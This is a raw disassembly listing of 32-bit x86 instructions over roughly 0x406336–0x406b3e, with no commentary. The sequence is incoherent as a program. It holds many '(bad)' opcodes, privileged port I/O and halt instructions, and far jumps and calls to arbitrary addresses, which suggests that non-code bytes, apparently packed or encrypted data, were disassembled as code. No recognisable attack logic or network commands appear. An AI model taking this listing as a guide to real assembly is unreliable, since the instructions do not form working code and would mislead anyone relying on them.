  406336:	pop    ebp
  406337:	and    dh,BYTE PTR [edx-0x779a71f6]
  40633d:	mov    BYTE PTR [edx-0x4e],al
  406340:	cwde   
  406341:	mov    dl,0xd7
  406343:	loop   0x406392
  406345:	lea    ecx,[eax-0x186fd368]
  40634b:	push   edi
  40634c:	pushf  
  40634d:	das    
  40634e:	jmp    0x97b28e7
  406353:	add    ch,bl
  406355:	pushf  
  406356:	mov    ecx,0x6a57c968
  40635b:	pop    edx
  40635c:	and    eax,0x9bab6d05
  406361:	jne    0x406329
  406363:	push   ebp
  406364:	jne    0x406309
  406366:	add    eax,0x27009bb
  40636b:	mov    dh,0xd5
  40636d:	jp     0x406309
  40636f:	push   0xe4449be9
  406374:	add    DWORD PTR [edx+0x76],0xd546bc16
  40637b:	mov    bl,0x77
  40637d:	mov    edi,0x5971260e
  406382:	pop    ds
  406383:	cmp    BYTE PTR [esi+0x7d038c2d],bh
  406389:	mov    ebx,0xcc6d67b9
  40638e:	lock push edx
  406390:	xchg   ebp,eax
  406391:	dec    esp
  406392:	rol    BYTE PTR [ebp-0x2d49da36],cl
  406398:	mov    al,0xa7
  40639a:	stos   BYTE PTR es:[edi],al
  40639b:	cwde   
  40639c:	scas   eax,DWORD PTR es:[edi]
  40639d:	or     dh,BYTE PTR [eax+ecx*4+0x38c34cd6]
  4063a4:	sbb    BYTE PTR [esi+esi*4-0x5f437447],dh
  4063ab:	pushf  
  4063ac:	leave  
  4063ad:	mov    esi,0x1b08daf4
  4063b2:	cmp    ah,BYTE PTR [edi]
  4063b4:	inc    edx
  4063b5:	mov    esp,0xf01294f0
  4063ba:	jae    0x406383
  4063bc:	xchg   DWORD PTR [eax],ebp
  4063be:	mov    eax,0x2872ba75
  4063c3:	mov    al,0x6e
  4063c5:	sub    eax,0x26f29fc
  4063ca:	jns    0x40638d
  4063cc:	addr16 psadbw mm0,mm0
  4063d0:	push   esp
  4063d1:	test   BYTE PTR [esi],al
  4063d3:	sahf   
  4063d4:	jmp    0x449c:0x9bfacd28
  4063db:	retf   
  4063dc:	push   edx
  4063dd:	jae    0x406416
  4063df:	shr    cl,0xef
  4063e2:	xchg   edi,eax
  4063e3:	adc    edi,DWORD PTR [eax+0x7788a605]
  4063e9:	fwait
  4063ea:	jo     0x4063a7
  4063ec:	dec    ebx
  4063ed:	adc    DWORD PTR [ebx+0x10],ecx
  4063f0:	fdivr  DWORD PTR [edx+0x318ab0ac]
  4063f6:	dec    dl
  4063f8:	mov    eax,0xc821ed14
  4063fd:	inc    ebx
  4063fe:	jecxz  0x406463
  406400:	lahf   
  406401:	stc    
  406402:	fbstp  TBYTE PTR [esp+ebx*2]
  406405:	scas   al,BYTE PTR es:[edi]
  406406:	jge    0x4063b9
  406408:	test   al,0x1e
  40640a:	(bad)  [ebx+0x746df5b2]
  406410:	xchg   DWORD PTR [ebp+esi*1+0x15],edx
  406414:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406415:	xor    cl,dh
  406417:	sbb    al,0xb1
  406419:	outs   dx,DWORD PTR ds:[esi]
  40641a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40641b:	mov    ds:0xf6a29a02,eax
  406420:	test   al,0x59
  406422:	adc    eax,0xf3a66391
  406427:	mov    eax,ds:0x7d504de1
  40642c:	mov    BYTE PTR [esi],dl
  40642e:	add    BYTE PTR [edx+eiz*8-0x30],dh
  406432:	push   esi
  406433:	and    al,0xbb
  406435:	jbe    0x4064aa
  406437:	adc    ecx,DWORD PTR [edx+eiz*2]
  40643a:	std    
  40643b:	jmp    0xf55c77b
  406440:	xchg   ebx,eax
  406441:	adc    eax,eax
  406443:	not    ah
  406445:	mov    ds:0x537b3d8b,al
  40644a:	rcr    eax,1
  40644c:	mov    eax,DWORD PTR [ecx+0x13]
  40644f:	sub    BYTE PTR [edx+ecx*2],ah
  406452:	jmp    0x406489
  406454:	std    
  406455:	sbb    ebp,DWORD PTR [ebx+0x31248df4]
  40645b:	sbb    esi,DWORD PTR [eax-0x80]
  40645e:	test   eax,0xfbd7e5fe
  406463:	hlt    
  406464:	lods   eax,DWORD PTR ds:[esi]
  406465:	jmp    DWORD PTR [eax-0x4ff57f41]
  40646b:	in     eax,0x95
  40646d:	or     eax,0xae5812ba
  406472:	jle    0x406409
  406474:	cmc    
  406475:	fs pop ds
  406477:	ds mov ch,0x27
  40647a:	sbb    esp,esi
  40647c:	leave  
  40647d:	or     BYTE PTR [ecx+0x57],ch
  406480:	xchg   edx,eax
  406481:	pop    DWORD PTR [edi]
  406483:	mov    ch,bh
  406485:	dec    esp
  406486:	ret    0xc0be
  406489:	iret   
  40648a:	arpl   WORD PTR [ebx],dx
  40648c:	mov    cl,0x41
  40648e:	xor    DWORD PTR [esi+eiz*2+0x5d],ebx
  406492:	or     eax,0xd35a1778
  406497:	daa    
  406498:	fild   QWORD PTR [ebx+0x6c]
  40649b:	mov    al,0x68
  40649d:	jo     0x40648d
  40649f:	rcl    BYTE PTR [edi],0xb6
  4064a2:	repnz inc eax
  4064a4:	cs out dx,al
  4064a6:	iret   
  4064a7:	push   es
  4064a8:	mov    ebx,0xe8bbac35
  4064ad:	push   ecx
  4064ae:	test   DWORD PTR [esi+0x49478cb1],esp
  4064b4:	cmp    BYTE PTR [esi-0x3fff75ca],ah
  4064ba:	dec    ebx
  4064bb:	push   ebp
  4064bc:	stos   DWORD PTR es:[edi],eax
  4064bd:	inc    ebx
  4064be:	push   ebx
  4064bf:	jbe    0x4064cd
  4064c1:	mov    bh,0xb8
  4064c3:	jbe    0x406485
  4064c5:	call   0xe6d4:0x82f7fc67
  4064cc:	pusha  
  4064cd:	gs mov bh,0x90
  4064d0:	push   esi
  4064d1:	sub    eax,0x14856c59
  4064d6:	(bad)  
  4064d7:	bound  edi,QWORD PTR [ecx]
  4064d9:	test   BYTE PTR [edx-0xe6a5c6e],dh
  4064df:	xchg   edi,eax
  4064e0:	jne    0x406521
  4064e2:	popf   
  4064e3:	ret    
  4064e4:	sar    DWORD PTR [ebp+0x44],0x22
  4064e8:	and    al,0xb5
  4064ea:	lds    ebp,FWORD PTR [ebx+esi*4+0x22]
  4064ee:	jb     0x40654e
  4064f0:	pop    ecx
  4064f1:	pop    eax
  4064f2:	xchg   esp,eax
  4064f3:	fadd   st,st(0)
  4064f5:	outs   dx,BYTE PTR ds:[esi]
  4064f6:	cmp    eax,0xdd555216
  4064fb:	push   ecx
  4064fc:	xor    BYTE PTR [eax+ebp*8-0x4f4a74d3],ch
  406503:	and    esi,DWORD PTR [eax]
  406505:	sbb    edi,DWORD PTR [edi-0x78]
  406508:	or     ah,BYTE PTR [eax-0x5f]
  40650b:	ficomp DWORD PTR [ecx+0xb]
  40650e:	and    esi,DWORD PTR [esp+eiz*8-0x1b32c3a]
  406515:	sbb    BYTE PTR [ebp+0x1a],cl
  406518:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406519:	imul   ebx,DWORD PTR [ebp-0x327c7b8f],0x8f39fa0d
  406523:	rcr    DWORD PTR [ebx+0x3f],1
  406526:	and    eax,0x2f73a3d5
  40652b:	mov    edx,eax
  40652d:	push   edi
  40652e:	mov    bh,0xec
  406530:	push   esp
  406531:	inc    BYTE PTR [edi+0x3f698871]
  406537:	mov    WORD PTR [ebx+0x25],fs
  40653a:	sbb    DWORD PTR [edi+0x1abbe076],0x68
  406541:	sbb    dl,bh
  406543:	popf   
  406544:	into   
  406545:	shl    DWORD PTR [edx+0x79dd2f9d],0x44
  40654c:	lds    esi,FWORD PTR [esi]
  40654e:	ror    bh,cl
  406550:	test   DWORD PTR [esi+0x2ab1e7da],0xa014f95
  40655a:	add    eax,eax
  40655c:	aad    0x3b
  40655e:	sbb    BYTE PTR [ecx-0x45],bl
  406561:	cs in  eax,dx
  406563:	inc    ebp
  406564:	fldcw  WORD PTR [ebp+0x4714c9a8]
  40656a:	jmp    0x406508
  40656c:	pop    esi
  40656d:	jns    0x406546
  40656f:	mov    eax,0xdfd56ac2
  406574:	or     al,0xea
  406576:	sub    edx,DWORD PTR [ebp-0x1f80f77e]
  40657c:	or     al,0x73
  40657e:	jecxz  0x406570
  406580:	pop    ds
  406581:	jg     0x4065cd
  406583:	lods   eax,DWORD PTR ds:[esi]
  406584:	mov    cl,0x37
  406586:	mov    edi,esp
  406588:	lods   al,BYTE PTR ds:[esi]
  406589:	jmp    0xa39d:0x1d2d19f5
  406590:	xchg   edx,eax
  406591:	pop    esp
  406592:	push   ecx
  406593:	pop    ebp
  406594:	dec    esp
  406595:	or     ebp,DWORD PTR [ecx+0x78117f5a]
  40659b:	cmp    BYTE PTR [edi+ebp*1-0x51],0xde
  4065a0:	dec    esp
  4065a1:	xor    BYTE PTR [eax],dl
  4065a3:	xchg   edi,eax
  4065a4:	sub    al,BYTE PTR [esi]
  4065a6:	push   es
  4065a7:	out    0x98,eax
  4065a9:	mov    ebx,0x8d1527a2
  4065ae:	cdq    
  4065af:	xchg   esp,eax
  4065b0:	jecxz  0x4065b2
  4065b2:	add    DWORD PTR [esp+eax*1],esi
  4065b5:	xchg   edx,eax
  4065b6:	scas   al,BYTE PTR es:[edi]
  4065b7:	fidiv  WORD PTR [esi+eiz*2+0x5d]
  4065bb:	sbb    DWORD PTR ds:0x19ff2eeb,ecx
  4065c1:	push   ebx
  4065c2:	add    eax,0x5fde52ae
  4065c7:	add    BYTE PTR [edi+0x6d108ba3],bl
  4065cd:	loop   0x4065a2
  4065cf:	fcmovnb st,st(5)
  4065d1:	or     eax,0x5121ae0f
  4065d6:	pushf  
  4065d7:	sub    al,0x10
  4065d9:	loope  0x4065dc
  4065db:	(bad)  
  4065dc:	sbb    dl,BYTE PTR ds:0x51cf23f3
  4065e2:	inc    eax
  4065e3:	or     bh,BYTE PTR [esi-0x5311ed80]
  4065e9:	lock inc esp
  4065eb:	sub    eax,0xf0af46d7
  4065f0:	xchg   esp,eax
  4065f1:	lods   eax,DWORD PTR ds:[esi]
  4065f2:	push   edx
  4065f3:	or     eax,0x2a6c7614
  4065f8:	mov    ebp,0x35340bd
  4065fd:	test   al,0x3a
  4065ff:	cli    
  406600:	sbb    DWORD PTR [edx+0x3e],edi
  406603:	imul   esp,DWORD PTR ds:0x99b51e7a,0xffbf55e8
  40660d:	out    dx,al
  40660e:	into   
  40660f:	mov    dl,0xe5
  406611:	pop    es
  406612:	mov    DWORD PTR [edx-0x7],edx
  406615:	xchg   eax,edi
  406617:	jmp    0xbb8d759a
  40661c:	stos   DWORD PTR es:[edi],eax
  40661d:	sub    eax,0xfe20a266
  406622:	outs   dx,DWORD PTR ds:[esi]
  406623:	pop    ebx
  406624:	and    eax,0x76af0e76
  406629:	mov    cl,BYTE PTR [ecx]
  40662b:	aam    0x1e
  40662d:	xchg   ebx,eax
  40662e:	fbstp  TBYTE PTR [ecx]
  406630:	mov    edi,0xd0a8703c
  406635:	inc    ebp
  406636:	les    ecx,FWORD PTR [ebp-0x6d48c5a6]
  40663c:	jp     0x406678
  40663e:	sub    al,0xe9
  406640:	jmp    0xa6929bdf
  406645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406646:	in     al,dx
  406647:	or     al,BYTE PTR gs:[edi+esi*4]
  40664b:	lods   eax,DWORD PTR ds:[esi]
  40664c:	leave  
  40664d:	dec    edi
  40664e:	fnstenv [edx]
  406650:	mov    esp,0x89a951f4
  406655:	jmp    0x8436adcd
  40665a:	fstp   DWORD PTR [esi]
  40665c:	(bad)  [edx]
  40665e:	nop
  40665f:	mov    esi,0xfc5477af
  406664:	push   ss
  406665:	cmp    cl,BYTE PTR [edx-0x42]
  406668:	inc    esp
  406669:	dec    eax
  40666a:	out    dx,al
  40666b:	jae    0x406643
  40666d:	test   eax,0x72d153b6
  406672:	and    eax,0x41b0c09c
  406677:	push   es
  406678:	mov    al,ds:0x761bed92
  40667d:	and    ecx,DWORD PTR [ecx+0x33]
  406680:	out    dx,al
  406681:	mov    ebx,0xbc51ddd0
  406686:	cmp    al,0x57
  406688:	fdivr  QWORD PTR [ebp-0x3a]
  40668b:	ret    0x12d9
  40668e:	inc    esi
  40668f:	inc    ebp
  406690:	retf   
  406691:	xchg   ebp,eax
  406692:	sbb    eax,DWORD PTR [edi-0x6cb8554d]
  406698:	xchg   BYTE PTR [eax+eiz*1-0x28],al
  40669c:	mov    ecx,0xcbdeafd9
  4066a1:	repz ja 0x406641
  4066a4:	leave  
  4066a5:	imul   esi,DWORD PTR [ebp+0x5b],0xffffff8c
  4066a9:	mov    es,WORD PTR [edi]
  4066ab:	inc    esi
  4066ac:	outs   dx,DWORD PTR ds:[esi]
  4066ad:	int    0x75
  4066af:	not    BYTE PTR [esp+edi*1-0x1c628f8e]
  4066b6:	add    eax,0xfa7c6692
  4066bb:	dec    edx
  4066bc:	adc    BYTE PTR [edi+0x5ecac87],cl
  4066c2:	jnp    0x4066d8
  4066c4:	cli    
  4066c5:	add    al,0xde
  4066c7:	popa   
  4066c8:	pushf  
  4066c9:	repz pop ecx
  4066cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066cc:	adc    cl,dh
  4066ce:	mov    eax,0xd8f65575
  4066d3:	jmp    0xb002:0xb98e02f6
  4066da:	hlt    
  4066db:	add    BYTE PTR [esi+0x76ae2900],al
  4066e1:	and    DWORD PTR [ebx+0xa917199],edi
  4066e7:	add    bh,0x6a
  4066ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066eb:	rol    BYTE PTR [ecx+0x34ac1c6a],1
  4066f1:	sbb    bh,BYTE PTR [esi+eax*4-0x80d370a]
  4066f8:	dec    edx
  4066f9:	sub    BYTE PTR [eax+0x5d],0x22
  4066fd:	sub    al,BYTE PTR [eax]
  4066ff:	inc    edx
  406700:	and    BYTE PTR [ecx-0x55ac7545],0xc2
  406707:	jle    0x4066fb
  406709:	jg     0x406709
  40670b:	jmp    0x406771
  40670d:	mov    eax,ds:0x9ee3f52c
  406712:	rcl    DWORD PTR [edi],cl
  406714:	repz sbb eax,0x889d9cdb
  40671a:	xor    eax,0x656f47d2
  40671f:	icebp  
  406720:	popa   
  406721:	cmp    ch,BYTE PTR [ebx+0x31744f0c]
  406727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406728:	mov    eax,ds:0x9d8625fa
  40672d:	and    DWORD PTR gs:[ecx-0xd9fb27e],ecx
  406734:	push   ds
  406735:	(bad)  
  406736:	push   eax
  406737:	dec    eax
  406738:	outs   dx,BYTE PTR ds:[esi]
  406739:	mov    ah,0x80
  40673b:	ss shr bl,1
  40673e:	mov    eax,0xd7743307
  406743:	xlat   BYTE PTR ds:[ebx]
  406744:	mov    eax,0x83b43c67
  406749:	test   eax,0xa954a9e4
  40674e:	pop    ss
  40674f:	mov    DWORD PTR [ecx-0x76],0x8181fe9b
  406756:	mov    edx,0xdf293bf9
  40675b:	jmp    0xa283:0xf96b8db
  406762:	mov    dl,0x7d
  406764:	and    BYTE PTR [edi-0xd],0xc8
  406768:	aaa    
  406769:	stos   BYTE PTR es:[edi],al
  40676a:	ins    BYTE PTR es:[edi],dx
  40676b:	jno    0x4067c6
  40676d:	sar    BYTE PTR [edx+0x34],1
  406770:	loop   0x40679d
  406772:	sbb    al,0x8e
  406774:	lahf   
  406775:	sbb    BYTE PTR [edx+0x595922b9],0x46
  40677c:	scas   al,BYTE PTR es:[edi]
  40677d:	pop    ds
  40677e:	fistp  DWORD PTR [ecx+0x14]
  406781:	sub    DWORD PTR [edx+0x5d32558b],0xffffffd0
  406788:	ins    BYTE PTR es:[edi],dx
  406789:	adc    DWORD PTR [ebp+0x5070670b],0x73deab40
  406793:	adc    eax,0xc72e1275
  406798:	xchg   edi,eax
  406799:	mov    esp,0xf8b9c1c0
  40679e:	fstp   DWORD PTR [eax-0x73c6ce3f]
  4067a4:	lds    edi,FWORD PTR ds:0x1eb68cb5
  4067aa:	gs fcomi st,st(2)
  4067ad:	fisubr DWORD PTR [ecx]
  4067af:	ss ret 
  4067b1:	fild   QWORD PTR [edx-0x8]
  4067b4:	push   cs
  4067b5:	push   ebp
  4067b6:	mov    eax,0x9cac9ecc
  4067bb:	stos   BYTE PTR es:[edi],al
  4067bc:	xchg   edi,eax
  4067bd:	mov    BYTE PTR [eax+eiz*8],al
  4067c0:	push   edx
  4067c1:	ss cli 
  4067c3:	jmp    0x3bad:0x3230d0e4
  4067ca:	out    0x62,eax
  4067cc:	and    cl,0x68
  4067cf:	out    dx,al
  4067d0:	or     bl,BYTE PTR ds:[esi+esi*1+0x7d]
  4067d5:	imul   eax,DWORD PTR [ecx-0x52],0x276e7e51
  4067dc:	xorps  xmm7,XMMWORD PTR [edi+0x78928464]
  4067e3:	lahf   
  4067e4:	push   esi
  4067e5:	addr16 or eax,0x88418782
  4067eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067ec:	or     DWORD PTR [ebx+0x71],ebx
  4067ef:	dec    ebx
  4067f0:	add    cl,al
  4067f2:	out    0xff,eax
  4067f4:	daa    
  4067f5:	fwait
  4067f6:	lock dec esi
  4067f8:	add    al,BYTE PTR [ebp-0xa5f34e6]
  4067fe:	cmp    eax,0x72cf3f94
  406803:	adc    esp,DWORD PTR [esi+0x663a0c1d]
  406809:	rcl    edi,cl
  40680b:	pop    edi
  40680c:	mov    ds:0xa1457105,al
  406811:	ss je  0x406841
  406814:	js     0x406797
  406816:	push   ss
  406817:	and    ch,BYTE PTR [edi-0x621ad28e]
  40681d:	rol    ch,0x44
  406820:	pop    esi
  406821:	mov    ch,dh
  406823:	xlat   BYTE PTR ds:[ebx]
  406824:	pushf  
  406825:	cwde   
  406826:	call   0x463e6824
  40682b:	mov    al,ds:0xe0b7ce0e
  406830:	cmp    al,BYTE PTR [ebp+ebp*1+0x7f]
  406834:	mov    cl,0x51
  406836:	rcr    DWORD PTR [edx-0x35],cl
  406839:	mov    al,0xaf
  40683b:	or     BYTE PTR [edx-0x1711e132],bh
  406841:	cmp    DWORD PTR [esi-0x35],esp
  406844:	jmp    0x406822
  406846:	test   eax,esi
  406848:	adc    DWORD PTR [edi+eiz*2+0x36e958bc],edi
  40684f:	mov    al,ah
  406851:	(bad)  
  406852:	and    ch,BYTE PTR [eax-0x6b]
  406855:	adc    BYTE PTR [eax],0x59
  406858:	stos   BYTE PTR es:[edi],al
  406859:	adc    ch,BYTE PTR [ebx+0x493def74]
  40685f:	sub    al,BYTE PTR [ecx+0x9]
  406862:	adc    eax,0x9b9fffe8
  406867:	adc    al,BYTE PTR [edi]
  406869:	xchg   ecx,eax
  40686a:	mov    cl,0xd0
  40686c:	stos   DWORD PTR es:[edi],eax
  40686d:	dec    eax
  40686e:	dec    BYTE PTR [ebx+0x77ff7797]
  406874:	and    ebx,ecx
  406876:	cmp    eax,0xc14d0f4d
  40687b:	push   edi
  40687c:	pop    eax
  40687d:	push   ebp
  40687e:	adc    eax,0x508ac6ab
  406883:	dec    edx
  406884:	mov    cl,0x1
  406886:	cwde   
  406887:	sub    DWORD PTR [ebp-0x62ae0bd0],0xbf0ea0e9
  406891:	jae    0x406867
  406893:	arpl   WORD PTR [ecx+0x1309aa47],bx
  406899:	test   ch,al
  40689b:	std    
  40689c:	stos   DWORD PTR es:[edi],eax
  40689d:	push   ebp
  40689e:	or     al,0xac
  4068a0:	imul   dl
  4068a2:	pushf  
  4068a3:	mov    ecx,0x146062ce
  4068a8:	push   edx
  4068a9:	repnz mov bl,0x32
  4068ac:	mov    ebp,0x2c4fd719
  4068b1:	add    al,BYTE PTR [eax+ebx*1]
  4068b4:	pusha  
  4068b5:	pop    edi
  4068b6:	shl    ah,cl
  4068b8:	fwait
  4068b9:	jne    0x406840
  4068bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068bc:	pop    ecx
  4068bd:	mov    ds:0xa3c6f7c7,eax
  4068c2:	sar    DWORD PTR [ebp+0x74a05848],1
  4068c8:	inc    ebx
  4068c9:	xchg   esp,eax
  4068ca:	out    0xbf,al
  4068cc:	pop    esp
  4068cd:	std    
  4068ce:	fld    TBYTE PTR [eax+eiz*2-0x7c]
  4068d2:	and    eax,0x18377c95
  4068d7:	jo     0x40693d
  4068d9:	les    esp,FWORD PTR [edx-0x6eab48c3]
  4068df:	fcom   DWORD PTR [esi+0x46]
  4068e2:	push   ebx
  4068e3:	loop   0x4068ed
  4068e5:	scas   eax,DWORD PTR es:[edi]
  4068e6:	pop    eax
  4068e7:	(bad)  
  4068e8:	outs   dx,DWORD PTR ds:[esi]
  4068e9:	mov    dh,0xdf
  4068eb:	test   al,0x39
  4068ed:	int3   
  4068ee:	and    edi,DWORD PTR [ecx]
  4068f0:	adc    BYTE PTR [edx+0x35376575],bl
  4068f6:	cdq    
  4068f7:	pushf  
  4068f8:	lods   al,BYTE PTR ds:[esi]
  4068f9:	xchg   edi,eax
  4068fa:	dec    ecx
  4068fb:	lds    esp,FWORD PTR [ebx+0x42]
  4068fe:	dec    ebx
  4068ff:	xchg   edi,eax
  406900:	fmul   QWORD PTR [ecx]
  406902:	jbe    0x4068da
  406904:	imul   eax,DWORD PTR [ebx],0x17
  406907:	add    DWORD PTR [esi+0x73],eax
  40690a:	test   ah,bh
  40690c:	(bad)  
  40690d:	mov    ebp,DWORD PTR [eax+0x57]
  406910:	xor    edx,DWORD PTR [edx-0x6feb575a]
  406916:	jp     0x406906
  406918:	popa   
  406919:	add    DWORD PTR [eax-0x72ae0432],edi
  40691f:	(bad)  
  406920:	leave  
  406921:	xchg   esi,eax
  406922:	daa    
  406923:	pusha  
  406924:	ret    
  406925:	dec    esi
  406926:	ds mov ch,0xd4
  406929:	loope  0x406961
  40692b:	stos   DWORD PTR es:[edi],eax
  40692c:	add    dh,ch
  40692e:	out    dx,eax
  40692f:	or     esp,DWORD PTR [ecx-0x2b]
  406932:	dec    eax
  406933:	xchg   ecx,eax
  406934:	adc    al,0x4f
  406936:	push   ebp
  406937:	sbb    esi,edi
  406939:	out    dx,eax
  40693a:	test   DWORD PTR [ebx],ebp
  40693c:	stos   DWORD PTR es:[edi],eax
  40693d:	fstp   QWORD PTR [edi+0x4f]
  406940:	fsub   DWORD PTR [ecx]
  406942:	inc    edx
  406943:	mov    ecx,0x20d997b3
  406948:	fcom   QWORD PTR [edi+0x3587f053]
  40694e:	sti    
  40694f:	loop   0x4068f3
  406951:	(bad)  [esi]
  406953:	jne    0x406977
  406955:	cmc    
  406956:	outs   dx,BYTE PTR ds:[esi]
  406957:	cwde   
  406958:	int    0x83
  40695a:	sub    edi,DWORD PTR [ecx+eiz*1-0x252502f4]
  406961:	mov    cl,0x7
  406963:	push   es
  406964:	loop   0x4069cf
  406966:	call   0x3e26:0xb0586433
  40696d:	xor    BYTE PTR [esi],al
  40696f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406970:	mov    al,ds:0xe946371d
  406975:	pop    ecx
  406976:	in     al,0xa
  406978:	sbb    al,0x1b
  40697a:	dec    eax
  40697b:	ins    BYTE PTR es:[edi],dx
  40697c:	icebp  
  40697d:	push   ebx
  40697e:	mov    ecx,0x129a027e
  406983:	retf   
  406984:	push   ds
  406985:	enter  0xd0e3,0xde
  406989:	dec    edi
  40698a:	dec    ecx
  40698b:	mov    ds:0x7eae27c6,eax
  406990:	pop    esp
  406991:	jg     0x4069b3
  406993:	adc    DWORD PTR [ecx],edi
  406995:	pushf  
  406996:	xchg   edx,eax
  406997:	out    0xf0,eax
  406999:	jnp    0x406a19
  40699b:	or     BYTE PTR [edi+0x29a5a375],0x23
  4069a2:	cmp    edx,esp
  4069a4:	imul   ebp,DWORD PTR ds:0xfd48b4af,0xfffffff4
  4069ab:	in     ax,dx
  4069ad:	adc    DWORD PTR [edi-0x3a],ecx
  4069b0:	dec    ecx
  4069b1:	pusha  
  4069b2:	mov    esi,0x67b358ba
  4069b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4069b8:	repz add eax,0xe1009cf5
  4069be:	pop    esi
  4069bf:	push   ebp
  4069c0:	(bad)  
  4069c1:	jb     0x406a36
  4069c3:	xchg   edi,eax
  4069c4:	jg     0x406a1a
  4069c6:	and    ecx,DWORD PTR [ebx-0x601afc60]
  4069cc:	mov    WORD PTR [ebp+0x68],ss
  4069cf:	test   eax,0xe0a24c41
  4069d4:	jb     0x406990
  4069d6:	xor    bl,cl
  4069d8:	fprem1 
  4069da:	push   0x94d2ddaf
  4069df:	data16 jbe 0x406a5d
  4069e2:	addr16 and al,0xe4
  4069e5:	ror    dh,0x88
  4069e8:	dec    ebp
  4069e9:	retf   0xe183
  4069ec:	cld    
  4069ed:	fs cmp al,bh
  4069f0:	push   eax
  4069f1:	push   cs
  4069f2:	cdq    
  4069f3:	mov    ah,0x51
  4069f5:	jecxz  0x406a6a
  4069f7:	enter  0x5ed5,0x72
  4069fb:	jecxz  0x406a0e
  4069fd:	xlat   BYTE PTR ds:[ebx]
  4069fe:	popa   
  4069ff:	je     0x4069c3
  406a01:	jns    0x406a68
  406a03:	test   BYTE PTR [esi+eiz*8],dh
  406a06:	and    ah,BYTE PTR [edi+0x42b42027]
  406a0c:	daa    
  406a0d:	loopne 0x406a04
  406a0f:	xchg   esi,eax
  406a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a11:	and    ecx,DWORD PTR [ecx+0xfc42b3c]
  406a17:	xchg   BYTE PTR [esi+0x1e],cl
  406a1a:	inc    esp
  406a1b:	xor    BYTE PTR ds:0x6394c2a9,dh
  406a21:	aas    
  406a22:	not    al
  406a24:	(bad)  
  406a25:	out    dx,al
  406a26:	cld    
  406a27:	out    dx,eax
  406a28:	in     eax,0xd1
  406a2a:	push   ds
  406a2b:	gs cld 
  406a2d:	or     BYTE PTR [ecx-0x3af27a56],ah
  406a33:	xor    dl,BYTE PTR [edx-0x772f73b]
  406a39:	inc    eax
  406a3a:	push   ebx
  406a3b:	inc    ecx
  406a3c:	xor    ebp,esp
  406a3e:	fdivr  DWORD PTR [edx-0x24]
  406a41:	adc    BYTE PTR [ecx+0x358204d0],bh
  406a47:	pop    edx
  406a48:	sub    ch,BYTE PTR [eax+0x7f014014]
  406a4e:	(bad)  
  406a50:	mov    al,BYTE PTR [ecx-0xa]
  406a53:	aam    0xe
  406a55:	and    eax,0xe3e1d738
  406a5a:	out    dx,eax
  406a5b:	dec    edx
  406a5c:	mov    edi,0xe4e2f0d4
  406a61:	in     al,dx
  406a62:	dec    ecx
  406a63:	fistp  WORD PTR [edi]
  406a65:	cmp    DWORD PTR [esi+0x5b],edx
  406a68:	xor    esi,edx
  406a6a:	sbb    eax,0x91b35953
  406a6f:	cmp    al,BYTE PTR [esi]
  406a71:	call   0x21ad:0x17c2cdbb
  406a78:	push   0xffffffb4
  406a7a:	out    0xc7,eax
  406a7c:	jecxz  0x406acd
  406a7e:	dec    eax
  406a7f:	mov    dh,bh
  406a81:	jo     0x406ac1
  406a83:	pop    esp
  406a84:	pop    ss
  406a85:	cs out 0x54,al
  406a88:	mov    ebx,0xe20a8519
  406a8d:	btr    edi,ecx
  406a90:	icebp  
  406a91:	lods   al,BYTE PTR ds:[esi]
  406a92:	jae    0x406a24
  406a94:	inc    ebx
  406a95:	xor    BYTE PTR [esi+eax*2],0x4d
  406a99:	stc    
  406a9a:	nop
  406a9b:	enter  0x90ef,0x7c
  406a9f:	loope  0x406a2b
  406aa1:	fs nop
  406aa3:	pop    edi
  406aa4:	(bad)  
  406aa5:	jnp    0x406aa5
  406aa7:	jge    0x406aa8
  406aa9:	pop    eax
  406aaa:	sbb    al,0x31
  406aac:	cmp    al,0xa8
  406aae:	xor    bl,bh
  406ab0:	rcr    DWORD PTR [esi],0xea
  406ab3:	add    ebx,ecx
  406ab5:	mov    dh,ch
  406ab7:	mov    ah,0xea
  406ab9:	push   0xffffff81
  406abb:	pop    ss
  406abc:	or     ebp,DWORD PTR [ebx-0xf]
  406abf:	icebp  
  406ac0:	push   edx
  406ac1:	mov    bl,0x2
  406ac3:	and    edx,0xe0e04464
  406ac9:	imul   ecx,DWORD PTR [ecx],0x5c6f748a
  406acf:	test   cl,dl
  406ad1:	push   esp
  406ad2:	mov    ah,0xa0
  406ad4:	mov    eax,ds:0x985a5bc7
  406ad9:	mov    al,ds:0xeb924540
  406ade:	sub    esi,esp
  406ae0:	fild   WORD PTR [esi+0x1f]
  406ae3:	cmp    al,0x8a
  406ae5:	xlat   BYTE PTR ds:[ebx]
  406ae6:	stc    
  406ae7:	test   DWORD PTR [esp+eiz*8+0x68aeaff3],0x7031b7ae
  406af2:	jle    0x406aa2
  406af4:	jmp    0x1116a515
  406af9:	stos   BYTE PTR es:[edi],al
  406afa:	call   0x6ec8:0x2302daed
  406b01:	sub    DWORD PTR [edi+0x1d62e27d],eax
  406b07:	pop    ebp
  406b08:	clc    
  406b09:	or     esp,DWORD PTR [ecx]
  406b0b:	mov    ds:0x4709cc78,eax
  406b10:	loope  0x406af0
  406b12:	out    dx,eax
  406b13:	pop    edi
  406b14:	xchg   ecx,eax
  406b15:	push   0xc17bb1b5
  406b1a:	stc    
  406b1b:	pop    ebx
  406b1c:	jle    0x406b50
  406b1e:	clc    
  406b1f:	ffree  st(6)
  406b21:	mov    ch,0xd0
  406b23:	mov    DWORD PTR [edx-0x57],esp
  406b26:	mov    cl,0x82
  406b28:	mov    ds:0xe3ccee21,eax
  406b2d:	or     al,0x58
  406b2f:	ins    BYTE PTR es:[edi],dx
  406b30:	ret    0x5768
  406b33:	mov    edx,0x6eb2c574
  406b38:	and    cl,BYTE PTR [eax+edx*1]
  406b3b:	scas   al,BYTE PTR es:[edi]
  406b3c:	outs   dx,DWORD PTR ds:[esi]
  406b3d:	xchg   ebx,eax
  406b3e:	in     al,dx
